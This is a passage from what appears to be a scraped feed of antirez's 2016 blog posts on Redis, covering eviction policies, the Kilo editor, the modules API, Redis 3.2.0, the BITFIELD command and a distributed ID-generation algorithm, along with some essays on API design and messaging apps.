<br>The 24 bit LFU counter is copied to the new object associated to the
<br>old key.
<br>
<br>The new eviction code of Redis unstable contains other good news:
<br>
<br>1. Policies are now “cross DB”. In the past Redis made local choices as explained at the start of this blog post. Now this is fixed for all the policies, not just LRU.
<br>
<br>2. The volatile-ttl eviction policy, which is the one that evicts based on the remaining time to live of keys with an expire set, now uses the pool like the other policies.
<br>
<br>3. Performances are better by reusing SDS objects in the pool of keys.
<br>
<br>This post ended a lot longer than I expected it to be, but I hope it offered a few insights on the new stuff and the improvements to the old things we already had. Redis, more than a “solution” to solve a specific problem, is a generic tool. It’s up to the sensible developer to apply it in the right way. Many people use Redis as a caching solution, so improvements in this area are always investigated from time to time.
<br>
<br>Hacker News comments: https://news.ycombinator.com/item?id=12185534
<a href=\"http://antirez.com/news/109\">Comments</a>" nil "http://antirez.com/news/109" "31691649f707c0fd387977b746fe2d60") (61 (26588 31767 64432 207000) "http://antirez.com/news/108
" "Writing an editor in less than 1000 lines of code, just for fun " nil "Sun, 10 Jul 2016 10:51:11 +0000" "WARNING: Long pretty useless blog post. TLDR is that I wrote, just for fun, a text editor in less than 1000 lines of code that does not depend on ncurses and has support for syntax highlight and search feature. The code is here: http://github.com/antirez/kilo.
<br>
<br>Screencast here: https://asciinema.org/a/90r2i9bq8po03nazhqtsifksb
<br>
<br>For the sentimentalists, keep reading…
<br>
<br>A couple weeks ago there was this news about the Nano editor no longer being part of the GNU project. My first reaction was, wow people still really care about an old editor which is a clone of an editor originally part of a terminal based EMAIL CLIENT. Let’s say this again, “email client”. The notion of email client itself is gone at this point, everything changed. And yet I read, on Hacker News, a number of people writing how they were often saved by the availability of nano on random systems, doing system administrator tasks, for example. Nano is also how my son wrote his first program in C. It’s an acceptable experience that does not require past experience editing files.
<br>
<br>This is how I started to think about writing a text editor ways smaller than Nano itself. Just for fun, basically, because I like and admire small programs.
<br>
<br>How lame, useless, wasting of time is today writing an editor? We are supposed to write shiny incredible projects, very cool, very complex, valuable stuff. But sometimes to make things without a clear purpose is refreshing. There were also memories…
<br>
<br>I remember my first experiences with the Commodore 16 in-ROM assembler, and all the home computers and BASIC interpreters I used later in my child life. An editor is a fundamental connection between the human and the machine. It allows the human to write something that the computer can interpret. The blinking of a square prompt is something that many of us will never forget.
<br>
<br>Well, all nice, but my time was very limited. A few hours across two weekends with programmed family activities and meat to prepare for friends in long barbecue sessions. Maybe I could still write an editor on a few spare hours with some trick. My goal was to write an editor which was very small, no curses, and with syntax highlighting. Something usable, basically. That’s the deal.. It’s little stuff, but is already hard to write all this from scratch in a few hours.
<br>
<br>But … wait, I actually wrote an editor in the past, is part of the LOAD81 project, a Lua based programming environment for children. Maybe I can just reuse it… and instead of using SDL to write on the screen what about sending VT100 escape sequences directly to the terminal? And I’ve code for this as well in linenoise, another toy project that eventually found its place in some may other serious projects. So maybe mixing the two…
<br>
<br>The first week Saturday morning I went to the sea, and it was great. Later my brother arrived from Edinburg to Catania, and at the end of the day we were together in the garden with our laptops, trying to defend ourselves from the 30 degrees that there were during the day, so I started to hack the first skeleton of the editor. The LOAD81 code was quite modular, to take it away from the original project was a joke. I could kinda edit after a few hours, and it was already time to go bed. The next day I worked again at it before leaving for the sea again. My 15yo sleeps till 1pm, as I did when I was 15yo in summertime after all, so I coded more in sprints of 30 minutes waiting for him to get up, using the rest of the time to play with my wonderful daughter. Finally later in the Sunday night I tried to fix all the remaining stuff.
<br>
<br>Hey I remember that a few years ago to hack on a project was, to *hack* on it, full time for days. I’m old now, but still young enough to write toy editors and consider it a serious business :-)
<br>
<br>However life is hard, and Monday arrived. Real business, no time for toy projects, not even time to release what I got during the weekend… It deserved some minimal polishing and a blog post.
<br>
<br>I had to wait this Monday to put my hands on the “Kilo” editor again. It’s called Kilo because it has less than 1024 lines of code. The “cloc” utility, used in order to count the number of lines of code, signaled me I still had ~100 lines of space before reaching 1024 LOC, and a serious editor needs a “search” feature after all. So back to the code, trying also to restructure and recomment it a bit, since you know, when you mix two projects pieces in a few hours the risk is that the code quality is less than excellent.
<br>
<br>Well, now it’s time to release it, end of this crazy project. Maybe somebody will use it as a starting point to write a real editor, or maybe it could be used to write some new interesting CLI that goes over the usual REPL style model.
<br>
<br>The code is at http://github.com/antirez/kilo
<br>
<br>HN comments: https://news.ycombinator.com/item?id=12065217
<a href=\"http://antirez.com/news/108\">Comments</a>" nil "http://antirez.com/news/108" "6c9f085d5664e7dcefc2442886474475") (60 (26588 31767 64145 811000) "http://antirez.com/news/107
" "Programmers are not different, they need simple UIs. " nil "Tue, 24 May 2016 15:06:17 +0000" "I’m spending days trying to get a couple of APIs right. New APIs about modules, and a new Redis data type.
<br>I really mean it when I say *days*, just for the API. Writing drafts, starting the implementation shaping data structures and calls, and then restarting from scratch to iterate again in a better way, to improve the design and the user facing part.
<br>
<br>Why I do that, delaying features for weeks? Is it really so important?
<br>Programmers are engineers, maybe they should just adapt to whatever API is better to export for the system exporting it.
<br>
<br>Should I really reply to my rhetorical questions? No, it is no longer needed today, and that’s a big win.
<br>
<br>I want to assume that at this point is tacit, given for granted, that programmers also have user interfaces, and that such user interfaces are so crucial to completely change the perception of a system. Database query languages, libraries calls, programming languages, Unix command line tools, they all have an User Interface part. If you use them daily, for you they are more UIs than anything else.
<br>
<br>So if this is all well known why I’m here writing this blog post? Because I want to stress how important is the concept of simplicity, not just in graphical UIs, but also in UIs designed for programmers. The act of iterating again and again to find a simple UI solution is not a form of perfectionism, it’s not futile narcissism. It is more an exploration in the design space, that sometimes is huge, made of small variations that make a big difference, and made of big variations that completely change the point of view. There are no rules to follow but your sensibility. Yes there are good practices, but they are not a good compass when the sea to navigate is the one of the design *space*.
<br>
<br>So why programmers should have this privilege of having good, simple UIs? Sure there is the joy of using something well made, that is great to handle, that feels *right*. But there is a more central question. Learning to configure Sendmail via M4 macros, or struggling with an Apache virtual host setup is not real knowledge. If such a system one day is no longer in use, what remains in your hands, or better, in your neurons? Nothing. This is ad-hoc knowledge. It is like junk food: empty calories without micronutrients.
<br>
<br>For programmers, the micronutrients are the ideas that last for decades, not the ad-hoc junk. I don’t want to ship junk, so I’ll continue to refine my designs before shipping. You should not accept junk, your neurons are better spent to learn general concepts. However in part it is inevitable: every system will have something that is not general that we need to learn in order to use it. Well, if that’s the deal, at least, let’s make the ad-hoc part a simple one, and if possible, something that is even fun to use.
<a href=\"http://antirez.com/news/107\">Comments</a>" nil "http://antirez.com/news/107" "67699d87d5ea6ad79c107207c48eff47") (59 (26588 31767 63934 505000) "http://antirez.com/news/106
" "Redis Loadable Modules System " nil "Tue, 10 May 2016 17:02:55 +0000" "It was a matter of time but it eventually happened. In the Redis 1.0 release notes, 7 years ago, I mentioned that one of the interesting features for the future was “loadable modules”. I was really interested in such a feature back then, but over the years I became more and more skeptic about the idea of adding loadable modules in Redis. And probably for good reasons.
<br>
<br>Modules can be the most interesting feature of a system and the most problematic one at the same
<br>time: API incompatibilities between versions, low quality modules crashing the system, a lack
<br>of identity of a system that is extendible are possible problems. SO, for years, I managed to avoided adding modules to Redis, and Lua scripting was a good tool in order to delay their addition. At the same time, years of experience with scripting, demonstrated that scripting is a way to “compose” existing features, but not a way to extend the capabilities of a system towards use cases it was not designed to cover.
<br>
<br>Previous attempts at modules also showed that one of the main pain points about mixing Redis
<br>and loadable modules is the way modules are bound with the Redis core. In may ways Redis resembles more a programming language than a database. To extend Redis properly, the module needs to have access to the internal API of the system. Directly exporting the Redis core functions to modules creates huge problems: the module starts to depend on the internal details of Redis. If the Redis core evolves, the module needs to be rewritten. This creates either a fragile modules ecosystem or stops the evolution of the Redis core. Redis internals can’t stop to evolve, nor the modules developers can keep modifying the module in order to stay updated with the internals (something that happened in certain popular systems in the past, with poor results).
<br>
<br>With all this lessons in mind, I was leaving Catania to fly to Tel Aviv, to have a meeting at
<br>Redis Labs to talk about the roadmap for the future months. One of the topics of our chat was loadable modules. During the flight I asked myself if it was possible to truly decouple the Redis core from the modules API, but still have a low level access to directly manipulate Redis data structure. So I started to immediately code something. What I wanted was an extreme level of API compatibility for the future, so that a module wrote today could work in 4 years from now with the same API, regardless of the changes to the Redis core. I also wanted binary compatibility so that the 4 years old module could even *load* in the new Redis versions and work as expected, without even the need to be recompiled.
<br>
<br>At the end of the flight I arrived in Tel Aviv with something already working in the “modules” branch. We discussed together how the API would work, and at the end everybody agreed that to be able to manipulate Redis internals directly was a fundamental feature. What we wanted to accomplish was to allow Redis developers to create commands that were as capable as the Redis native commands, and also as fast as the native commands. This cannot be accomplished just with an high level API that calls Redis commands, it’s too slow and limited. There is no point in having a Redis modules system that can just do what Lua can already do. You need to be able to say, get me the value associated with this key, what type is it? Do this low level operation on the value. Given me a cursor into the sorted set at this position, go to the next element, and so forth. To create an API that works as an intermediate layer for such low level access is tricky, but definitely possible.
<br>
<br>I returned home and started to work at the modules system immediately. After a couple of weeks I had a prototype that was already functional enough to develop interesting modules, featuring low level functions like data types low level access, strings DMA to poke with the internals of strings without wrappers when needed, a replication API, an interesting sorted set iterator API, and so forth. It looked was a very promising start, however the project was kinda of “secret” because it was not clear if it was viable initially. Also we wanted to avoid everybody to start developing modules while the API was extremely unstable and subject to changes.
<br>
<br>The result of this process, while not complete, is very promising, so today I’m announcing the new feature at Redis Conference 2016, and the code was just pushed into the “unstable” branch. But let’s check the API a bit…
<br>
<br>Here is a trivial example of what a module can do and how it works. It implements a
<br>“list splice” operation that moves elements from a list to another:
<br>
<br>int HelloListSpliceAuto_RedisCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
<br>    if (argc != 4) return RedisModule_WrongArity(ctx);
<br>
<br>    RedisModule_AutoMemory(ctx);
<br>
<br>    RedisModuleKey *srckey = RedisModule_OpenKey(ctx,argv[1],
<br>        REDISMODULE_READ|REDISMODULE_WRITE);
<br>    RedisModuleKey *dstkey = RedisModule_OpenKey(ctx,argv[2],
<br>        REDISMODULE_READ|REDISMODULE_WRITE);
<br>
<br>    /* Src and dst key must be empty or lists. */
<br>    if ((RedisModule_KeyType(srckey) != REDISMODULE_KEYTYPE_LIST &&
<br>         RedisModule_KeyType(srckey) != REDISMODULE_KEYTYPE_EMPTY) ||
<br>        (RedisModule_KeyType(dstkey) != REDISMODULE_KEYTYPE_LIST &&
<br>         RedisModule_KeyType(dstkey) != REDISMODULE_KEYTYPE_EMPTY))
<br>    {
<br>        return RedisModule_ReplyWithError(ctx,REDISMODULE_ERRORMSG_WRONGTYPE);
<br>    }
<br>
<br>    long long count;
<br>    if ((RedisModule_StringToLongLong(argv[3],&count) != REDISMODULE_OK) ||
<br>        (count < 0))
<br>    {
<br>        return RedisModule_ReplyWithError(ctx,\"ERR invalid count\");
<br>    }
<br>
<br>    while(count-- > 0) {
<br>        RedisModuleString *ele;
<br>
<br>        ele = RedisModule_ListPop(srckey,REDISMODULE_LIST_TAIL);
<br>        if (ele == NULL) break;
<br>        RedisModule_ListPush(dstkey,REDISMODULE_LIST_HEAD,ele);
<br>    }
<br>
<br>    size_t len = RedisModule_ValueLength(srckey);
<br>    RedisModule_ReplyWithLongLong(ctx,len);
<br>    return REDISMODULE_OK;
<br>}
<br>
<br>int RedisModule_OnLoad(RedisModuleCtx *ctx) {
<br>    if (RedisModule_Init(ctx,\"helloworld\",1,REDISMODULE_APIVER_1)
<br>        == REDISMODULE_ERR) return REDISMODULE_ERR;
<br>
<br>    if (RedisModule_CreateCommand(ctx,\"hello.list.splice.auto\",
<br>        HelloListSpliceAuto_RedisCommand,
<br>        \"write deny-oom\",1,2,1) == REDISMODULE_ERR)
<br>        return REDISMODULE_ERR;
<br>}
<br>
<br>There was a big effort into providing a clean API, and an API that is not prone to misuses.
<br>For example there is support for automatic memory management, so that the context the command
<br>operates on, collects the objects that are not explicitly freed by the user, in order to free them when the command returns if needed. This makes writing modules a lot simpler.
<br>
<br>You can find the API documentation here (not perfect but there is enough to get familiar):
<br>https://github.com/antirez/redis/blob/unstable/src/modules/INTRO.md
<br>
<br>And the API reference here:
<br>https://github.com/antirez/redis/blob/unstable/src/modules/API.md
<br>
<br>And many simple examples of commands here:
<br>https://github.com/antirez/redis/blob/unstable/src/modules/helloworld.c
<br>
<br>The API is yet not complete nor stable, and will be released with the next stable version of Redis (likely 4.0). However it is already enough to do a lot of things, and my colleagues did very interesting things, from inverted indexes to authentication systems. In the next weeks we’ll fill all the holes, for example there is no low level Set API, so you’ll have to use Call() style API for now. Similarly the iterator is only provided for the sorted set type, and so forth.
<br>
<br>But the important point is that the process is now started, and Redis is becoming an extendible system.
<br>I think this will give more power to Redis users, power to go “faster” than the project itself, in using Redis to model their problems, with the big promise that, after Redis 4.0 RC is out, we’ll not break the API ever for years to come, so that modules work will not get wasted.
<br>Note that we *can improve* the API, since the module registration asks for a given API version,
<br>so it will be possible to maintain the backward compatibility while at the same time release new versions of the API.
<br>
<br>Soon there will be a Modules Directory were you can register your modules, using redis-cli, into a server that talks the Redis protocol. It was not possible to finish it in time unfortunately, but it is just a matter of weeks.
<br>
<br>I’m very very excited about what will happen now! Modules will have a Bazar model like clients, so there will not be “official modules”. The good ones will be used for sure, and all will get listed in the Redis site, probably ranked by Github stars or something like that.
<br>
<br>I hope many users will start to be part of the modules ecosystem and make Redis able to solve very specific use cases that was not wise to solve inside the core, but that are a good fit for modules.
<br>
<br>Now I need your feedbacks while the API is still malleable. Tell me what you think!
<a href=\"http://antirez.com/news/106\">Comments</a>" nil "http://antirez.com/news/106" "79d0f66bec2206924fb9d7de78fe4d0d") (58 (26588 31767 63468 861000) "http://antirez.com/news/105
" "Three ideas about text messages " nil "Sat, 07 May 2016 18:42:15 +0000" "I’m aboard of a flight bringing me to San Francisco. Eventually I purchased the slowest internet connection of my life (well at least for a good reason), but for several hours I was without internet, as usually when I fly.
<br>
<br>I don’t mind staying disconnected for some time usually. It’s a good time to focus, write some code, or a blog post like this one. However when I’m disconnected, what makes the most difference is not Facebook or Twitter or Github, but the lack of text messages.
<br>
<br>At this point text messages are a fundamental thing in my life. They are also probably the main source of distraction. I use messages to talk with my family, even just to communicate between different floors. I use messages with friends to organize dinners and vacations. I even use messages with the plumber or the doctor.
<br>
<br>Clearly messages are not going to go away. They need to get better, so I usually tend to thing at topics related to messaging applications. The following are three recurrent thoughts I’ve about this topic.
<br>
<br>1. WhatsApp is not used in the US.
<br>
<br>Do you know what’s the social network that is reshaping the most the way we communicate in Europe? Is the WhatsApp application. Since it is the total standard and an incredible amount of the population has it, “WhatsApp Groups” is changing the way people communicate. There is a group for each school class, one for the children and one for the parents. One for families, another for groups of friends. One for the kindergarten of my daughter, where teachers post from time to time pictures of our children doing activities.
<br>
<br>WhatsApp is also one of the main pains of modern life. All this groups continuously beep. However what they are doing for the society is incredible: they are truly making every human being interconnected. This magic is possible because here in Italy, and in most other EU countries, WhatsApp is *the standard* so everybody assumes you use it.
<br>
<br>To me it is pretty incredible that this is not happening in the US, the place where most social applications are funded and created. Given that in the US there are both Android and iOS phones I wonder what’s stopping this from happening. My guess is that it’s just a matter of time and a unified messaging platform will happen there too.
<br>
<br>* Why voice recognition is not used more.
<br>
<br>For people that can write text fast into a real keyboard, the software keyboard of the phone is one of the most annoying things ever. Similarly, teenagers excluded, many other people have issues writing long text messages with a phone keyboard.
<br>
<br>At the same time, the voice recognition software of Android, powered by the Google servers, reached a point where it rarely does errors at all, so why just a few people use it on a daily basis? My theory is that the user interface to activate and use the voice recognition feature is so bad to be the main barrier to make this feature a big hit.
<br>
<br>First you have to find how to activate it, and usually is not a prominent button on the keyboard. Then there is this delay and it emits a beep and starts to listen, and it’s not clear exactly how to stop it, especially if the environment is aloud. The whole thing looks like if you are suffering from the servers latency, but voice is voice. With delays and non clear experience you kill the big advantage of talking to your phone. This should be just a “push the button while you talk” thing. When you push the button, the system starts to record your voice immediately and connects asynchronously to the servers. As text arrives back, it is shown to the user. When the user releases the button the voice thing is done. As simple as that. At the end, the words that were inserted in this way could be shown in some special way (like a different gray) in the text area, so that one can tap individual words and select alternatives if there are errors.
<br>
<br>Please Google freaking do that. I wonder if it’s any better on iOS, I don’t use it for some time at this point.
<br>
<br>* Auto transcription of text messages.
<br>
<br>Since the phone keyboard is such a mess, people are using more and more voice messages, especially with WhatsApp. It is very convenient for people writing messages, since there is the “push and talk” experience that there is not in the speech to text feature. However it is not always very convenient for the people receiving the message, that may be in an environment where to listen to the conversation is not easy.
<br>
<br>However there is something that could work in that regard, that is, the WhatsApp (or whatever) servers, should automatically translate the message to text, so that the user can both play the message or just look at the text, if it’s clear enough. When there are doubts on given words, the text can be highlighted in some way to show the user that it’s better to listen to the voice message since there are non clear words, however this could easily make 95% of messages promptly available to the user just reading.
<br>
<br>This way the feature would be friction-less both ways, for the users writing (dictating actually) and for the user receiving the messages.
<br>
<br>
<br>TLDR: Messaging is everywhere, make it better.
<a href=\"http://antirez.com/news/105\">Comments</a>" nil "http://antirez.com/news/105" "d7a7563e79034057387f925f091984dd") (57 (26588 31767 63173 278000) "http://antirez.com/news/104
" "Redis 3.2.0 is out! " nil "Fri, 06 May 2016 11:07:50 +0000" "It took more than expected, but finally we have it, Redis 3.2.0 stable is out with changes that may be useful to a big number of Redis users. At this point I covered the changes multiple time, but the big ones are:
<br>
<br>* The GEO API. Index whatever you want by latitude and longitude, and query by radius, with the same speed and easy of use of the other Redis data structures. Here you can find the API documentation: http://redis.io/commands/#geo. Thank you to Matt Stancliff for the initial implementation, that was reworked but is still at the core of the GEO API, and to the developers of ARDB for providing the geo indexing code that Matt used.
<br>
<br>* The new BITFIELD command allows to use a Redis string as a bit array composed of many integers with user specified size and offset. It supports increments and decrements to exploit this small (or large) integers as counters, with fine control over the overflow behavior. http://redis.io/commands/bitfield. Thanks to Yoav Steinberg for pushing forward this crazy idea and motivating me to write an implementation.
<br>
<br>* Many improvements to Redis Cluster, including rebalancing capabilities in redis-trib and better replicas migration. However support for NATted envrionments and Docker port forwarding, while implemented in the “unstable” branch, was not backported to 3.2 for maturity concerns.
<br>
<br>* Improvements to Lua scripts replication. It is now possible to use “effects replication” to write scripts containing side effects. It’s documented here:  http://redis.io/commands/EVAL.  Thanks to Yossi Gottlieb for stimulating the addition of this feature and helping in the design.
<br>
<br>* We have now a serious Lua scripts debugger: https://www.youtube.com/watch?v=IMvRfStaoyM with support into redis-cli. Thanks to Itamar Haber, developer of non trivial scripts since the start of Lua scripting, that really wanted this feature and helped during the development.
<br>
<br>* Redis is now more memory efficient thanks to changes operated by Oran Agra to SDS and the Jemalloc size classes setup. Also we have a new List internal representation contributed by Matt Stancliff which uses just a small percentage of the memory used before to represent large lists!
<br>
<br>* Finally slaves and masters are in agreement about what keys are expired during read operations. It was about time :-)
<br>
<br>* SPOP now accepts an optional count argument. Thanks to Alon Diamant for providing the initial implementation. I kinda rewrote it for performances later, and we ended with a pretty fast thing.
<br>
<br>* RDB AUX fields. So now your RDB files have a few informations inside, like the server that generated it, in what date, and so forth. Soon we’ll have redis-cli able to parse those fields (in 3.2.1) hopefully. It’s a small amount of work but I’m remembering only know writing this notes, honestly.
<br>
<br>* RDB loading is faster now.
<br>
<br>* Sentinel can now scale monitoring many masters, but should be considered more an advanced beta than stable, so please test it in your environment carefully before deploying, a lot of code changed inside Sentinel internals.
<br>
<br>* Many more things but this list is already long enough.
<br>
<br>A big thank you to all the contributors that made this release possible, to the Redis user base which is lovely and encouraging, and to Redis Labs for sponsoring a lot of the work that went into 3.2.0.
<br>
<br>During the previous weeks we also worked to a new interesting feature that will be released in the next versions of Redis, it will be announced during RedisConf 2016 in San Francisco, 10-11 May, so stay tuned!
<br>
<br>One note about stability. I keep saying it all the time, but stability in software is not black and white. It’s like pink, yellow and green. No just kidding. It’s the usual shades of gray. So 3.2.0 looks solid, however it’s fresh meat. Start to use it incrementally and check how it works for you, and please report any issue promptly. However it’s also true that given that it stayed in RC for a lot of time, it was already tested by the brave users that were too much in need for the new features to deploy it ASAP.
<br>
<br>The 3.2.0 full changelog is here: https://raw.githubusercontent.com/antirez/redis/3.2/00-RELEASENOTES
<br>
<br>Redis 3.2.0 can be obtained as a tarball at http://download.redis.io, or by fetching the 3.2.0 tag from Github antirez/redis repository.
<br>
<br>Enjoy!
<a href=\"http://antirez.com/news/104\">Comments</a>" nil "http://antirez.com/news/104" "8504304b8138a7edda4fb53e10974f3e") (56 (26588 31767 62905 759000) "http://antirez.com/news/103
" "100 more of those BITFIELDs " nil "Fri, 26 Feb 2016 15:02:54 +0000" "Today Redis is 7 years old, so to commemorate the event a bit I passed the latest couple of days doing a fun coding marathon to implement a new crazy command called BITFIELD.
<br>
<br>The essence of this command is not new, it was proposed in the past by me and others, but never in a serious way, the idea always looked a bit strange. We already have bit operations in Redis: certain users love it, it’s a good way to represent a lot of data in a compact way. However so far we handle each bit separately, setting, testing, getting bits, counting all the bits that are set in a range, and so forth.
<br>
<br>What about implementing bitfields? Short or large, arbitrary sized integers, at arbitrary offsets, so that I can use a Redis string as an array of 5 bits signed integers, without losing a single bit of juice.
<br>
<br>A few days ago, Yoav Steinberg from Redis Labs, proposed a set of commands on arbitrary sized integers stored at bit offsets in a more serious way. I smiled when I read the email, since this was kinda of a secret dream. Starting from Yoav proposal and with other feedbacks from Redis Labs engineers, I wrote an initial specification of a single command with sub-commands, using short names for types definitions, and adding very fine grained control on the overflow semantics.
<br>
<br>I finished the first implementation a few minutes ago, since the plan was to release it for today, in the hope Redis appreciates we do actual work in its bday.
<br>
<br>The resulting BITFIELD command supports different subcommands:
<br>
<br>SET <type> <offset> <value> — Set the specified value and return its previous value.
<br>GET <type> <offset> — Get the specified value.
<br>INCRBY <type> <offset> <increment> — Increment the specified counter.
<br>
<br>There is an additional meta command called OVERFLOW, used to set (guess what) the overflow semantics of the commands that will follow (so OVERFLOW can be specified multiple times):
<br>
<br>OVERFLOW SAT — Saturation, so that overflowing in one direction or the other, will saturate the integer to its maximum value in the direction of the overflow.
<br>OVERFLOW WRAP — This is usual wrap around, but the interesting thing is that this also works for signed integers, by wrapping towards the most negative or most positive values.
<br>OVERFLOW FAIL — In this mode the operation is not performed at all if the value would overflow.
<br>
<br>The integer types can be specified using the “u” or “i” prefix followed by the number of bits, so for example u8, i5, u20 and i53 are valid types. There is a limitation: u64 cannot be specified since the Redis protocol is unable to return 64 bit unsigned integers currently.
<br>
<br>It's time for a few examples: in order to increment an unsigned integer of 8 bits I could use:
<br>
<br>127.0.0.1:6379> BITFIELD mykey incrby u8 100 1
<br>1) (integer) 3
<br>
<br>This is incrementing an unsigned integer, 8 bits, at offset 100 (101th bit in the bitmap).
<br>
<br>However there is a different way to specify offsets, that is by prefixing the offset with “#”, in order to say: \"handle the string as an array of counters of the specified size, and set the N-th counter\". Basically this just means that if I use #10 with an 8 bits type, the offset is obtained by multiplying 8*10, this way I can address multiple counters independently without doing offsets math:
<br>
<br>127.0.0.1:6379> BITFIELD mykey incrby u8 #0 1
<br>1) (integer) 1
<br>127.0.0.1:6379> BITFIELD mykey incrby u8 #0 1
<br>1) (integer) 2
<br>127.0.0.1:6379> BITFIELD mykey incrby u8 #1 1
<br>1) (integer) 1
<br>127.0.0.1:6379> BITFIELD mykey incrby u8 #1 1
<br>1) (integer) 2
<br>
<br>The ability to control the overflow is also interesting. For example an unsigned counter of 1 bit will actually toggle between 0 and 1 with the default overflow policy of “wrap”:
<br>
<br>127.0.0.1:6379> BITFIELD mykey incrby u1 100 1
<br>1) (integer) 1
<br>127.0.0.1:6379> BITFIELD mykey incrby u1 100 1
<br>1) (integer) 0
<br>127.0.0.1:6379> BITFIELD mykey incrby u1 100 1
<br>1) (integer) 1
<br>127.0.0.1:6379> BITFIELD mykey incrby u1 100 1
<br>1) (integer) 0
<br>
<br>As you can see it alternates 0 and 1.
<br>
<br>Saturation can also be useful:
<br>
<br>127.0.0.1:6379> bitfield mykey overflow sat incrby i4 100 -3
<br>1) (integer) -3
<br>127.0.0.1:6379> bitfield mykey overflow sat incrby i4 100 -3
<br>1) (integer) -6
<br>127.0.0.1:6379> bitfield mykey overflow sat incrby i4 100 -3
<br>1) (integer) -8
<br>127.0.0.1:6379> bitfield mykey overflow sat incrby i4 100 -3
<br>1) (integer) -8
<br>
<br>As you can see, decrementing 3 never goes under -8.
<br>
<br>Note that you can carry multiple operations in a single command. It always returns an array of results:
<br>
<br>127.0.0.1:6379> BITFIELD mykey get i4 100 set u8 200 123 incrby u8 300 1
<br>1) (integer) -8
<br>2) (integer) 123
<br>3) (integer) 7
<br>
<br>The intended usage for this command is real time analytics, A/B testing, showing slightly different things to users every time by using the overflowing of integers. Packing so many small counters in a shared and memory efficient way can be exploited in many ways, but that’s left as an exercise for the talented programmers of the Redis community.
<br>
<br>The command will be backported into the stable version of Redis in the next weeks, so this will be usable very soon.
<br>
<br>Curious about the implementation? It's more complex you could expect probably: https://github.com/antirez/redis/commit/70af626d613ebd88123f87a941b0dd3570f9e7d2
<a href=\"http://antirez.com/news/103\">Comments</a>" nil "http://antirez.com/news/103" "851a5a2d86f1a47030bd342a2a90c453") (55 (26588 31767 62595 9000) "http://antirez.com/news/102
" "The binary search of distributed programming " nil "Sat, 13 Feb 2016 16:49:13 +0000" "Yesterday night I was re-reading Redlock analysis Martin Kleppmann wrote (http://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html). At some point Martin wonders if there is some good way to generate monotonically increasing IDs with Redis.
<br>
<br>This apparently simple problem can be more complex than it looks at a first glance, considering that it must ensure that, in all the conditions, there is a safety property which is always guaranteed: the ID generated is always greater than all the past IDs generated, and the same ID cannot be generated multiple times. This must hold during network partitions and other failures. The system may just become unavailable if there are less than the majority of nodes that can be reached, but never provide the wrong answer (note: as we'll see this algorithm has another liveness issue that happens during high load of requests).
<br>
<br>So for the sake of playing a bit more with distributed systems algorithms, and learn a bit more in the process, I tried to find a solution.
<br>Actually I was aware of an algorithm that could solve the problem. It’s an inefficient one, not suitable to generate tons of IDs per second. Many complex distributed algorithms, like Raft and Paxos, use it as a step in order to get monotonically increasing IDs, as a foundation to mount the full set of properties they need to provide. This algorithm is fascinating since it’s extremely easy to understand and implement, and because it’s very intuitive to understand *why* it works. I could say, it is the binary search of distributed algorithms, something easy enough but smart enough to let newcomers to distributed programming to have an ah!-moment.
<br>
<br>However I had to modify the algorithm in order to adapt it to be implemented in the client side. Hopefully it is still correct (feedbacks appreciated). While I’m not going to use this algorithm in order to improve Redlock (see my previous blog post), I think that trying to solve this kind of problems is both a good exercise, and it may be an interesting read for people approaching distributed systems for the first times looking for simple problems to play with in real world systems.
<br>
<br>## How it works?
<br>
<br>The algorithm requirements are the following two:
<br>
<br>1. A data store that supports the operation set_if_less_than().
<br>
<br>2. A data store that can fsync() data to disk on writes, before replying to the client.
<br>
<br>The above includes almost any *SQL server, Redis, and a number of other stores.
<br>
<br>We have a set of N nodes, let’s assume N = 5 for simplicity in order to explain the algorithm.
<br>We initialize the system by setting a key called “current” to the value of 0, so in Redis terms, we do:
<br>
<br>    SET current 0
<br>
<br>In all the 5 instances. This is part of the initialization and must be done only when a new “cluster” is initialized. This step can be skipped but makes the explanation simpler.
<br>
<br>In order to generate a new ID, this is what we do:
<br>
<br>1: Get the “current” value from the majority of instances (3 or more if N=5).
<br>
<br>2: If we failed to reach 3 instances, GOTO 1.
<br>
<br>3: Get the maximum value among the ones we obtained, and increment it by 1. Let’s call this $NEXTID
<br>
<br>4: Send the following write operation to all the nodes we are able to reach.
<br>
<br>    IF current < $NEXTID THEN
<br>        SET current $NEXTID
<br>        return $NEXTID
<br>    ELSE
<br>        return NULL
<br>    END
<br>
<br>5: If 3 or more instances will reply $NEXTID, the algorithm succeeded, and we successfully generated a new monotonically increasing ID.
<br>
<br>6: Otherwise, if we have not reached the majority, GOTO 1.
<br>
<br>What we send at step 4 can be easily translated to a simple Redis Lua script:
<br>
<br>    local val = tonumber(redis.call('get',KEYS[1]))
<br>    local nextid = tonumber(ARGV[1])
<br>
<br>    if val < nextid then
<br>        redis.call('set',KEYS[1],nextid)
<br>        return nextid
<br>    else
<br>        return nil
<br>    end
<br>
<br>## Is it safe?
<br>
<br>The reason why I intuitively believe that it works, other than the fact that, in a modified form is used as a step in deeply analyzed algorithms, is that:
<br>
<br>If we are able to obtain the majority of “votes”, it is impossible by definition that any other client obtained the majority for an ID greater or equal to the one we generated. Otherwise there were already 3 or more instances with a value of current >= $NEXTID, and it would be impossible for us to get the majority. So the IDs generated are always greater than the past IDs, and for the same condition it is impossible for two instances to generate the same ID.
<br>
<br>Maybe some kind reader could point to a bug in the algorithm or to an analysis of this algorithm as used in other analyzed systems, however given that the above is adapted to be executed client-side, there are actually more processes involved and it should be re-analyzed in order to provide a proof that it is equivalent.
<br>
<br>## Why it’s a slow algorithm?
<br>
<br>The problem with this algorithm is concurrent accesses. If many clients are trying to generate new IDs at the same time, nobody may get the majority, and they will need to retry again, with larger numbers. Note that this also means that there could be “holes” in the sequence of generated IDs, so the clients could be able to generate the sequence 1, 2, 6, 10, 11, 21, … Because many numbers could be “burn” by the split brain condition caused by concurrent access.
<br>
<br>(Note that in the above sentence \"split brain\" does not mean that there is an inconsistent state between the nodes, just that it was not possible to reach the majority to agree about a given ID. Usually split brain refers to a conflict in the configuration where, for example, multiple nodes claim to be a master. However in the Raft paper the term split brain is used with the same meaning I'm using here).
<br>
<br>How many IDs per second you can generate without incurring frequent failures due to concurrent accesses depends on the network RTT and number of concurrent clients. What’s interesting however is that you can make the algorithm more scalable by creating an “IDs server” that talks to the cluster, and mediates the access of the clients by serializing the generation of the new IDs one after the other. This does not create a single point of failure since you don’t need to have a single ID server, you can run a few for redundancy, and have hundreds of clients connecting to it.
<br>
<br>Using this schema to generate 5k IDs/sec, should be viable, especially if the client is implemented in a smart way, trying to send the requests to the 5 nodes at the same time, using some multiplexing or threaded approach.
